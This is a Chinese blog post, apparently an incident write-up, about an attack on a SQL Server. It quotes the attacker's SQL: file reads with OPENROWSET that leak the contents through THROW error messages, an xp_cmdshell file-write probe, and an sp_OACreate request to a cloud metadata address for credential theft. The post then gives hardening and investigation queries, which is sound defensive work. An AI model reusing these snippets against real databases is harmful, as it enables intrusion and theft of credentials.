
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/allen0118/p/23810243" title="发布于 2026-11-28 10:31">
    

    <span role="heading" aria-level="2">记录SQL Server 遭入侵：从 OPENROWSET 读文件到 xp_cmdshell，再到窃取云凭证</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><strong>事件类型</strong><span>：数据库层渗透 / 内网横向 / 云凭证窃取尝试<br><strong>涉及组件</strong><span>：SQL Server（OPENROWSET、xp_cmdshell、sp_OACreate、THROW）<br><strong>风险等级</strong><span>：高（虽部分命令因权限被拒，但已具备完整攻击意图与链路）</span></span></span></p>
<p>&nbsp;</p>
<h2><span>一、事件背景</span></h2>
<p class="ds-markdown-paragraph"><span>在日常巡检服务器时，发现硬盘上多出了一些命名毫无规律<span>的陌生文件夹，点开后里面还有一些莫名其妙的文件。用记事本打开后内容如下：</span></span></p>
<p class="ds-markdown-paragraph"><span><span><img src="https://img2024.cnblogs.com/blog/141602/202611/141602-20261128094314491-386814234.png" alt="屏幕截图 2026-11-28 093438" loading="lazy"></span></span></p>
<p><img src="https://img2024.cnblogs.com/blog/141602/202611/141602-20261128094322680-409592293.png" alt="屏幕截图 2026-11-28 093524" loading="lazy"></p>
<p>&nbsp;</p>
<p><span>继续查看数据库日志，发现应用执行了一些不存在的存储过程<span>，同时还调用了 <code>cmdshell</code><span> 命令：</span></span></span></p>
<p><img src="https://img2024.cnblogs.com/blog/141602/202611/141602-20261128102421660-1740202164.png" alt="屏幕截图 2026-11-28 094242" loading="lazy"></p>
<p>&nbsp;</p>
<p>再打开数据库，发现有一张业务表中被写入了异常数据：</p>
<p><img src="https://img2024.cnblogs.com/blog/141602/202611/141602-20261128100709281-1841120072.png" alt="屏幕截图 2026-11-28 092644" loading="lazy"></p>
<p>&nbsp;</p>
<p><span>初步判断，这不是误操作，而是一次有明确目的的攻击尝试<span>。</span></span></p>
<h2><span>二、攻击行为分析</span></h2>
<h3><span>2.1 利用 OPENROWSET(BULK) 读取服务器文件</span></h3>
<p class="ds-markdown-paragraph"><span>从日志中的语句形态看，攻击者使用了类似下面的组合：</span></p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 读取服务器上的 appsettings.json</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span> <span style="color: rgba(128, 128, 128, 1)">*</span> <span style="color: rgba(0, 0, 255, 1)">FROM</span> <span style="color: rgba(255, 0, 255, 1)">OPENROWSET</span>(<span style="color: rgba(0, 0, 255, 1)">BULK</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">K:\api\appsettings.json</span><span style="color: rgba(255, 0, 0, 1)">'</span>, SINGLE_CLOB) <span style="color: rgba(0, 0, 255, 1)">AS</span><span style="color: rgba(0, 0, 0, 1)"> x;

</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 借助 THROW 将文件内容作为错误信息抛出</span>
THROW <span style="color: rgba(128, 0, 0, 1); font-weight: bold">50000</span>, <span style="color: rgba(0, 128, 0, 1)">@fileContent</span>, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span>;</pre>
</div>
<p>大概思路如下：</p>
<ol start="1">
<li>
<p class="ds-markdown-paragraph"><span>用 <code>OPENROWSET(BULK ...)</code><span> 以 SQL Server 服务账号的身份读取磁盘文件；</span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>由于 <code>THROW</code><span> 的错误信息（<code>message</code><span>）会原样回显到客户端 / 应用日志；</span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>攻击者便可以把文件内容“夹带”在报错信息里，带出数据库<span>，最后在应用日志中回收。</span></span></p>
</li>
</ol>
<p class="ds-markdown-paragraph">攻击目标：<span> <code>appsettings.json</code><span> 中通常包含 数据库连接字符串、API Key、第三方服务密钥、JWT Secret<span> 等敏感信息，一旦泄露即可进一步横向或接管业务。</span></span></span></p>
<h3><span>2.2 利用 xp_cmdshell 向 Web 目录写文件</span></h3>
<p class="ds-markdown-paragraph"><span>日志中出现如下命令：</span></p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">EXEC</span> xp_cmdshell <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">cmd /c echo X11737ba6 &gt; K:\api\wwwroot.132185ac\t.txt</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</pre>
</div>
<p>思路如下：</p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>通过 <code>xp_cmdshell</code><span> 调用系统 <code>cmd</code><span>，向 Web 根目录写入文件；</span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>写入内容虽然只是一个标记字符串（<code>X11737ba6</code><span>），但这通常是攻击者验证命令执行权限与写入权限是否可用<span>的探针；</span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>一旦验证成功，下一步极可能就是写入 WebShell / 后门脚本<span>，实现从「数据库」到「操作系统」的持久化控制。</span></span></p>
</li>
</ul>
<blockquote>
<p class="ds-markdown-paragraph"><span style="color: rgba(255, 0, 0, 1)"><strong>本次尝试因文件系统权限被拒绝而失败，但攻击链路已经暴露：数据库 → 操作系统 → Web 应用，属于典型的高危渗透路径。</strong></span></p>
</blockquote>
<h3><span>2.3 利用 sp_OACreate 请求云元数据服务窃取凭证</span></h3>
<p class="ds-markdown-paragraph"><span>日志中更值得警惕的是这一段：</span></p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">DECLARE</span> <span style="color: rgba(0, 128, 0, 1)">@h</span> <span style="color: rgba(0, 0, 255, 1)">INT</span>, <span style="color: rgba(0, 128, 0, 1)">@r</span> <span style="color: rgba(0, 0, 255, 1)">NVARCHAR</span>(<span style="color: rgba(255, 0, 255, 1)">MAX</span><span style="color: rgba(0, 0, 0, 1)">);

</span><span style="color: rgba(0, 0, 255, 1)">EXEC</span> sp_OACreate <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">MSXML2.ServerXMLHTTP.6.0</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(0, 128, 0, 1)">@h</span><span style="color: rgba(0, 0, 0, 1)"> OUTPUT;

</span><span style="color: rgba(0, 0, 255, 1)">EXEC</span> sp_OAMethod <span style="color: rgba(0, 128, 0, 1)">@h</span>, <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">open</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(0, 0, 255, 1)">NULL</span><span style="color: rgba(0, 0, 0, 1)">,
     </span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">GET</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">,
     </span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">http://169.254.169.254/openstack/latest/meta_data.json</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">,
     </span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">false</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">;

</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 后续通常还会配合 sp_OAMethod 'send' 与 'responseText' 取回结果</span></pre>
</div>
<p>思路如下：</p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>通过 <code>sp_OACreate</code><span> 创建 <code>MSXML2.ServerXMLHTTP</code><span> COM 对象，使 数据库进程主动向外发起 HTTP 请求<span>；</span></span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>请求目标指向云环境的元数据服务地址<span>（OpenStack 风格的 <code>169.254.169.254</code><span> 元数据路径<span>）；</span></span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>这类元数据接口通常返回实例的 临时凭证（AccessKey / SecretKey / Token）、实例信息、UserData<span> 等；</span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>攻击者意图非常明确：拿到云主机临时凭证后，横向控制该云账号下的其他资源<span>，危害面远超单台服务器。</span></span></p>
</li>
</ul>
<p class="ds-markdown-paragraph">&nbsp;</p>
<h2><span>三、处置措施</span></h2>
<h3><span>3.1 关闭 SQL Server 高危功能</span></h3>
<p class="ds-markdown-paragraph"><span>以下三项是本次事件的核心利用点，建议全部关闭<span>：</span></span></p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 1) 禁用 xp_cmdshell</span>
<span style="color: rgba(0, 0, 255, 1)">EXEC</span> sp_configure <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">show advanced options</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">RECONFIGURE</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">EXEC</span> sp_configure <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">xp_cmdshell</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">RECONFIGURE</span><span style="color: rgba(0, 0, 0, 1)">;

</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 2) 禁用 OLE Automation Procedures（对应 sp_OACreate）</span>
<span style="color: rgba(0, 0, 255, 1)">EXEC</span> sp_configure <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">Ole Automation Procedures</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">RECONFIGURE</span><span style="color: rgba(0, 0, 0, 1)">;

</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 3) 禁用 Ad Hoc Distributed Queries（限制 OPENROWSET / OPENDATASOURCE）</span>
<span style="color: rgba(0, 0, 255, 1)">EXEC</span> sp_configure <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">Ad Hoc Distributed Queries</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">RECONFIGURE</span>;</pre>
</div>
<p>&nbsp;</p>
<h3><span>&nbsp;3.2 账号与权限收敛</span></h3>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>禁用 <code>sa</code><span> 账号<span>：检查 <code>sa</code><span> 状态，若处于启用状态立即禁用；</span></span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph">清理僵尸账号<span>：排查是否存在临时创建、长期未登录、来源异常的登录名；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">遵循最小权限<span>：业务账号避免直接授予 <code>db_owner</code><span> / <code>dbo</code><span>，按需授予 <code>SELECT / INSERT / UPDATE / DELETE</code><span> 及必要的 <code>EXECUTE</code><span>；</span></span></span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph">禁止应用账号拥有高权限<span>：Web 应用连接数据库的账号不应具备 <code>sysadmin</code><span>、<code>CONTROL SERVER</code><span> 等权限。</span></span></span></p>
</li>
</ul>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 检查 sa 是否启用</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span> name, is_disabled <span style="color: rgba(0, 0, 255, 1)">FROM</span> sys.server_principals <span style="color: rgba(0, 0, 255, 1)">WHERE</span> name <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">sa</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">;

</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 检查高权限账号</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span><span style="color: rgba(0, 0, 0, 1)"> p.name, p.type_desc, p.is_disabled
</span><span style="color: rgba(0, 0, 255, 1)">FROM</span><span style="color: rgba(0, 0, 0, 1)"> sys.server_principals p
</span><span style="color: rgba(128, 128, 128, 1)">JOIN</span> sys.server_role_members m <span style="color: rgba(0, 0, 255, 1)">ON</span> p.principal_id <span style="color: rgba(128, 128, 128, 1)">=</span><span style="color: rgba(0, 0, 0, 1)"> m.member_principal_id
</span><span style="color: rgba(128, 128, 128, 1)">JOIN</span> sys.server_principals r <span style="color: rgba(0, 0, 255, 1)">ON</span> m.role_principal_id <span style="color: rgba(128, 128, 128, 1)">=</span><span style="color: rgba(0, 0, 0, 1)"> r.principal_id
</span><span style="color: rgba(0, 0, 255, 1)">WHERE</span> r.name <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">sysadmin</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</pre>
</div>
<p>&nbsp;</p>
<h3><span>3.3 排查并清理入侵痕迹</span></h3>
<ul>
<li>
<p class="ds-markdown-paragraph">删除攻击者创建的目录与文件<span>：重点排查 Web 根目录及 SQL Server 可写路径下的陌生目录、<code>.txt</code><span> / <code>.aspx</code><span> / <code>.ashx</code><span> / <code>.php</code><span> 等可疑文件；</span></span></span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph">核查数据库对象<span>：检查是否被创建了恶意存储过程、触发器、作业（Job）、计划任务；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">核查表数据<span>：定位被写入异常数据的表，清理数据并追踪写入来源；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">核查出站连接<span>：检查数据库服务器是否访问过 169.254.169.254&nbsp;<span>&nbsp;等可疑 IP / 元数据地址；</span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph">轮换凭证<span>：<code>appsettings.json</code><span> 中的连接字符串、API Key、云 AccessKey 等一律视为已泄露，全部轮换<span>。</span></span></span></p>
</li>
</ul>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 检查近期新建/修改的存储过程与触发器</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span><span style="color: rgba(0, 0, 0, 1)"> name, create_date, modify_date, type_desc
</span><span style="color: rgba(0, 0, 255, 1)">FROM</span><span style="color: rgba(0, 0, 0, 1)"> sys.objects
</span><span style="color: rgba(0, 0, 255, 1)">WHERE</span> type <span style="color: rgba(128, 128, 128, 1)">IN</span> (<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">P</span><span style="color: rgba(255, 0, 0, 1)">'</span>,<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">TR</span><span style="color: rgba(255, 0, 0, 1)">'</span>,<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">FN</span><span style="color: rgba(255, 0, 0, 1)">'</span>,<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">IF</span><span style="color: rgba(255, 0, 0, 1)">'</span>,<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">TF</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">)
</span><span style="color: rgba(0, 0, 255, 1)">ORDER</span> <span style="color: rgba(0, 0, 255, 1)">BY</span> create_date <span style="color: rgba(0, 0, 255, 1)">DESC</span><span style="color: rgba(0, 0, 0, 1)">;

</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 检查 SQL Agent 作业</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span> name, enabled, date_created, date_modified <span style="color: rgba(0, 0, 255, 1)">FROM</span> msdb.dbo.sysjobs;</pre>
</div>
<p>&nbsp;</p>
<h2><span>四、总结</span></h2>
<p class="ds-markdown-paragraph"><span>本次事件虽然部分命令因权限被拒未成功<span>，但攻击者已经完整走通了「读文件 → 回显外带 → 命令执行尝试 → 云凭证窃取尝试<span>」的链路，属于典型的从数据库渗透到操作系统、再向云环境横向<span>的攻击模式。</span></span></span></span></p>
<p class="ds-markdown-paragraph"><span>几个关键教训：</span></p>
<ol start="1">
<li>
<p class="ds-markdown-paragraph">数据库不是孤岛<span>。<code>OPENROWSET</code><span>、<code>xp_cmdshell</code><span>、<code>sp_OACreate</code><span> 这些功能一旦开放，数据库就成了攻击者进入操作系统的跳板；</span></span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph">最小权限是底线<span>。文件系统权限、数据库账号权限、云 IAM 权限，任意一层收紧都可能阻断攻击链；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">日志是最后的证据链<span>。应用日志中的异常报错、数据库日志中的非法存储过程调用，往往是发现入侵的第一线索；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">凭证泄露要按“已失陷”处理<span>。凡是可能被读取过的配置文件，其中的密钥必须全部轮换。</span></p>
</li>
</ol>
<blockquote>
<p class="ds-markdown-paragraph">&nbsp;</p>
</blockquote>

</div>
